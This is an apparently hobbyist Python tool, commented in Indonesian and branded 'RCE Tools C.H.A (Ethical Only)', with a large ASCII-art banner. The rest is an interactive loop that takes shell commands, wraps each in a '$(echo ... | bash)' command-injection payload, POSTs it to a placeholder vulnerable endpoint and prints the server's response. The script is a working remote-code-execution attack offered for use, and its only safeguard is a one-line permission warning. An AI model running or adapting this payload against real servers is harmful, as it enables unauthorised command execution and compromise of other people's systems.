import requests

# Kode warna ANSI
RED = "\033[91m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
RESET = "\033[0m"

# Fungsi untuk menampilkan ASCII art
def show_ascii_art():
    ascii_art = r"""
                                                                                          
                                                                                          
                                                                                          
                                     '`^^`'`````'^^``''''.                                
                               ''   {. .;  :'.`` `^``"  .<^`'``.                          
                          .^^^''[`""?"  l  .^```.````,. 'l  "''`^^..                      
             .`'.'     .^^`''^`."'   .^,           "^   .   i^'`' :`"^.   ^'^`'           
            .: :>+'  ^"``>.!^^,'   .>c#|           ]#ci.    . '^'<'^"`]. 'i;".;.          
             ;I^`"' .^:^.  `~j?   'n#v_"l{rc^ ^cx1!"~v#u`   <x~`    .]. .",^"!;           
             `!.`."?;.`^ "r(|/    /f<]c###t'   .|###z]<tr    )|(x,    '_>'.' ,'           
                 .. ']`.?#{1*'  "x^'_\##\:``' '``,(##/-`'?,  .z1[#j.."!. '                
                   . '``"i}#}  ^#|:^,"_-/##)' '}*#f--`l,`,},  -#1[?;^`` .                 
                    .`.'"/]u^  <?"  ,""~!".     .^l~I<;". ^,  ^#t_1'..'                   
                     >,.  ;}.  ^' ```'.`,i_]; :[_>:`.',;"`..` .~]^ .';                    
                '   .##f"`.";"`:'^ .;t#z[_ux. .jv-]c#f;.  ``i^":".^+*#.   '               
               'c^  .##?/z,;^ :+!><|#/>~n#f.   .\#u+i/#*II[(\l `;"r>##'  `z`              
               jrr   u#Ic}`".^?\1-)/_1###<       l*##(>(|~?{)):``'-I#z   jrn              
              "#,#)  ,c;:' `i"<rc<?[?v*_'         .~z#/}[l_?#]!"`.."]:  (#,#:             
              _#lf#/..,' ``]n'{_]`:+|~`              ~_?:;"-I~_[ ^^ .,'}#x,#{             
              -#n:##u,,`"" *-.)>[(_:+:/+`''''''''''`1]:::>]~(`~z `+,`,]##;j#)             
              :##!r###l.`vt#nv!   ."`";;][1vvvuvn?}[:I'^'   ;vn#tz, !u##rI##!             
              .v#z:*###< .<#{.    .^":',;Ij}\c*11/:;^```'     ?#<. I###*:z#z.             
               ^*#ni*###, .#>     .^;#/;',;!t]>t;;"`~n,`'     l#. ^####>u##"              
                ^z#ni*##c. z{     .+{####f]'.`"|1?*###]>'     u] ^##v>n#f'   `'           
                .j#vin##, ]c     .:{###*cvu-`n\ntcz##},'    .n} 'l;\[^ .,1*?#f            
                 ?n;u##(,.  ,(u|#/    :.~:^!t*##*nn*/l^,+.,    (#\u|,  .,1*#v             
                 'x^~{####|,. ."]z(  .[l^''. ."t#t". .'.^"/;  }*[,. .")*###}i{.             
                  ^c#/>\####*]`  `ztI):I^^```.  f   '```',;I(|*^  `?z####t>t#z"              
                   .1##(~1#####\` ]#*+"''    '`"*"''     ''[nvx"`(#####(<1##|.               
                     ^|##r-?f####z_i}#/'       ^#"       .)#);;z####r?-f##\^                 
                       '<u##\?xz###I'`\*-'     ,#,     ._*t`.;v##x*[|##v+'                   
                          'lv##rx1(xI  ^\#("   ;#i   ^{*/^  ,n{|/n#*#{`                      
                          `|],,:~<]I`jjjx###z]^~#-`-c###njjj^:?~;i",,/_.                     
                        .{j:;`'.       .....',:]#1,,`.....        ''";;n>                    
                       'n1`'`.           .`;-(,|#r")];`.            ''`^f/.                  
                      ,/^'`.       ."l?/cx_".  r#v  ."+jc/]!".        '`':f'                 
                     I>''            '"^.      c##      .^"'             '`_"                
                    "'                         ...                         .^,               
                                                                                          
                                """ + f"{RED}Tools From C.H.A (Ethical Only){RESET}"
    print(ascii_art)

# Konfigurasi target
target_url = "http://example.com/vulnerable_endpoint"
vulnerable_param = "input"

# Payload untuk menjalankan perintah
def create_payload(command):
    return f"$(echo {command} | bash)"

# Fungsi untuk mengirim payload
def send_payload(command):
    payload = create_payload(command)
    data = {vulnerable_param: payload}

    print(f"[INFO] Mengirim payload: {payload}")

    try:
        response = requests.post(target_url, data=data, timeout=5)
        if response.status_code == 200:
            print(f"[SUKSES] Respon dari server:\n{response.text}")
        else:
            print(f"[GAGAL] Status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Permintaan gagal: {e}")

# Menu interaktif
def main():
    show_ascii_art()
    print(f"{BLUE}=== RCE Tools C.H.A ==={RESET}")
    print(f"{YELLOW}[!] Gunakan dengan izin eksplisit.{RESET}")

    while True:
        command = input(f"{YELLOW}Masukkan perintah shell ('exit' untuk keluar): {RESET}")
        if command.lower() == "exit":
            print("Keluar dari alat.")
            break

        send_payload(command)

if __name__ == "__main__":
    main()

